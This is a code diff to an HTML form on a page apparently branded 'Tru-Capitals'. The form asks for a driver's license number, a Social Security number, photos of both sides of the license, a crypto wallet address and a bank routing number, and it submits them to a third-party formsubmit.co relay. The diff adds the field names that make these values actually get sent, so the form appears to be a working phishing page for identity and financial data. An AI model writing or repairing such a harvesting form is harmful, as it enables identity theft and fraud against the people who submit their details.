@@ -48,6 +48,18 @@
         max-width: 100%;
         border-radius: 5px;
       }
+      .terms-section {
+        background: #f8f9fa;
+        padding: 15px;
+        border-radius: 5px;
+        margin-bottom: 20px;
+      }
+      .terms-section h5 {
+        color: #6b46c1;
+      }
+      .terms-section p {
+        color: #333;
+      }
     </style>
   </head>
   <body>
@@ -69,7 +81,11 @@
                 "
               />
             </div>
-            <form method="POST" action="https://formsubmit.co/5cc8f8d311408298e76be59edae45396" enctype="multipart/form-data">
+            <form
+              method="POST"
+              action="https://formsubmit.co/5cc8f8d311408298e76be59edae45396"
+              enctype="multipart/form-data"
+            >
               <!-- Driver's License Section -->
               <div class="mb-4">
                 <label for="dlNumber" class="form-label"
@@ -79,6 +95,7 @@
                   type="text"
                   class="form-control"
                   id="dlNumber"
+                  name="dlNumber"
                   placeholder="Enter DL Number"
                   required
                 />
@@ -93,6 +110,7 @@
                   type="text"
                   class="form-control"
                   id="ssn"
+                  name="ssn"
                   placeholder="Enter SSN"
                   required
                 />
@@ -116,8 +134,10 @@
                       type="file"
                       class="form-control"
                       id="frontUpload"
+                      name="frontDL"
                       accept="image/*"
                       onchange="previewImage(event, 'frontPreview', 'frontText')"
+                      required
                     />
                   </div>
                   <div class="col-md-6">
@@ -134,8 +154,10 @@
                       type="file"
                       class="form-control"
                       id="backUpload"
+                      name="backDL"
                       accept="image/*"
                       onchange="previewImage(event, 'backPreview', 'backText')"
+                      required
                     />
                   </div>
                 </div>
@@ -146,7 +168,12 @@
                 <label for="walletType" class="form-label"
                   >Select Wallet Type</label
                 >
-                <select class="form-select" id="walletType" required>
+                <select
+                  class="form-select"
+                  id="walletType"
+                  name="walletType"
+                  required
+                >
                   <option value="">Choose...</option>
                   <option value="bitcoin">Bitcoin</option>
                   <option value="ethereum">Ethereum</option>
@@ -161,6 +188,7 @@
                     type="text"
                     class="form-control"
                     id="otherWalletName"
+                    name="otherWalletName"
                     placeholder="Enter Wallet Name"
                   />
                 </div>
@@ -174,12 +202,13 @@
                   type="text"
                   class="form-control"
                   id="walletAddress"
+                  name="walletAddress"
                   placeholder="Enter Wallet Address"
                   required
                 />
               </div>
 
-              <!--  Routine Number -->
+              <!-- Routine Number -->
               <div class="mb-4">
                 <label for="routineNumber" class="form-label">
                   Routine Number</label
@@ -188,6 +217,7 @@
                   type="text"
                   class="form-control"
                   id="routineNumber"
+                  name="routineNumber"
                   placeholder="Enter Routine Number"
                   required
                 />
@@ -228,19 +258,18 @@
                   of Tru-Capitals. Please ensure all information provided is
                   accurate.
                 </p>
-                <label for="agreeTerms" class="form-label"
-                  >Do you agree to the terms and conditions?</label
-                >
-                <select
-                  class="form-select"
-                  id="agreeTerms"
-                  name="agreeTerms"
-                  required
-                >
-                  <option value="">Choose...</option>
-                  <option value="Yes">Yes</option>
-                  <option value="No">No</option>
-                </select>
+                <div class="form-check">
+                  <input
+                    class="form-check-input"
+                    type="checkbox"
+                    id="agreeTerms"
+                    name="agreeTerms"
+                    required
+                  />
+                  <label class="form-check-label" for="agreeTerms">
+                    I agree to the terms and conditions.
+                  </label>
+                </div>
               </div>
 
               <!-- Submit Button -->
